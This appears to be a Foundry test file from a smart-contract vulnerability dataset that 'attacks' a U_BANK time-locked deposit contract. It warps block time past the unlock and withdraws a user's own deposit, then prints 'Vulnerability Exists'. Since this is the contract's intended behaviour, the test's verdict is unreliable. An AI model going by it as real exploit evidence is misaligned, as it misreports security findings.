// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x7541b76cb60f4c60af330c208b0623b7f54bf615.sol";

contract U_BANKTest is Test {
    U_BANK public u_bank;
    Log public logContract;
    address public user = makeAddr("user");

    function setUp() public {
        // Deploy contracts
        logContract = new Log();
        u_bank = new U_BANK(address(logContract));
        
        // Fund user with enough ether
        vm.deal(user, 10 ether);
    }

    function testTimestampManipulation() public {
        uint256 depositAmount = 10 ether;
        uint256 withdrawalAmount = 5 ether;
        uint256 currentBlockTime = block.timestamp;
        uint256 unlockTime = currentBlockTime + 1000; // 1000 seconds lock

        // User deposits funds
        vm.prank(user);
        u_bank.Put{value: depositAmount}(unlockTime);

        // Verify deposit balances
        assertEq(address(u_bank).balance, depositAmount, "Deposit not received");
        assertEq(address(user).balance, 0, "User funds not deducted");

        // Attempt withdrawal before unlock time - should have zero effect
        uint256 initialBankBalance = address(u_bank).balance;
        uint256 initialUserBalance = address(user).balance;
        
        vm.prank(user);
        u_bank.Collect(withdrawalAmount);
        
        assertEq(address(u_bank).balance, initialBankBalance, "Withdrawal should not happen before unlock");
        assertEq(address(user).balance, initialUserBalance, "User balance should not change");

        // Warp beyond unlock time to simulate the vulnerable scenario
        vm.warp(unlockTime + 1);

        console.log("--- BEFORE-Trigger Withdrawal ---");
        uint256 userBalanceBefore = address(user).balance;
        uint256 bankBalanceBefore = address(u_bank).balance;
        console.log("User ETH balance before: %d", userBalanceBefore);
        console.log("Bank contract ETH balance before: %d", bankBalanceBefore);

        console.log("--- Trigger Withdrawal ---");
        // Perform withdrawal after timestamp manipulation
        vm.prank(user);
        u_bank.Collect(withdrawalAmount);

        console.log("--- AFTER-Trigger Withdrawal ---");
        uint256 userBalanceAfter = address(user).balance;
        uint256 bankBalanceAfter = address(u_bank).balance;
        console.log("User ETH balance after: %d", userBalanceAfter);
        console.log("Bank contract ETH balance after: %d", bankBalanceAfter);

        // Calculate balance changes
        uint256 userBalanceDiff = userBalanceAfter - userBalanceBefore;
        uint256 bankBalanceDiff = bankBalanceBefore - bankBalanceAfter;
        console.log("Change in user balance: +%d", userBalanceDiff);
        console.log("Change in bank balance: -%d", bankBalanceDiff);
        
        // Final vulnerability verdict
        bool attackSuccess = (userBalanceDiff == withdrawalAmount) && 
                             (bankBalanceDiff == withdrawalAmount);
        if (attackSuccess) {
            console.log("Vulnerability Exists: Withdrawal succeeded with timestamp manipulation");
        } else {
            console.log("Vulnerability not Exist: Withdrawal did not execute as expected");
        }
    }
}